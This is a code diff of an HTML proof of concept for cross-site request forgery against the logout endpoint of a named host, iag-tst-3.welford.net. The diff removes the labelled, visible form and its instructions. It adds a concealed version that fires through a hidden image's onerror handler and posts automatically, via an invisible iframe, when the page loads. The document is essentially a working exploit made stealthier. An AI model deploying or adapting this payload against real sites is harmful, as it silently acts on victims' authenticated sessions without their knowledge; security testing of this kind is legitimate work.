@@ -1,18 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>CSRF Logout PoC</title>
-</head>
 <body>
-    <h2>CSRF Logout - iag-tst-3.welford.net</h2>
-    <p>Open this file in the same browser where you are logged in.</p>
-
-    <!-- Auto-submitting form POST -->
-    <form id="f" method="POST" action="https://iag-tst-3.welford.net/api/auth/logout">
-    </form>
-
-    <script>
-        document.getElementById('f').submit();
-    </script>
+<img src="x" style="display:none" onerror="logout()">
+<script>
+function logout() {
+  var f = document.createElement('iframe');
+  f.style.display = 'none';
+  f.name = 'csrf';
+  document.body.appendChild(f);
+  var form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'https://iag-tst-3.welford.net/api/auth/logout';
+  form.target = 'csrf';
+  form.enctype = 'application/json';
+  var input = document.createElement('input');
+  input.type = 'hidden';
+  input.name = '{}';
+  form.appendChild(input);
+  document.body.appendChild(form);
+  form.submit();
+}
+</script>
 </body>
 </html>
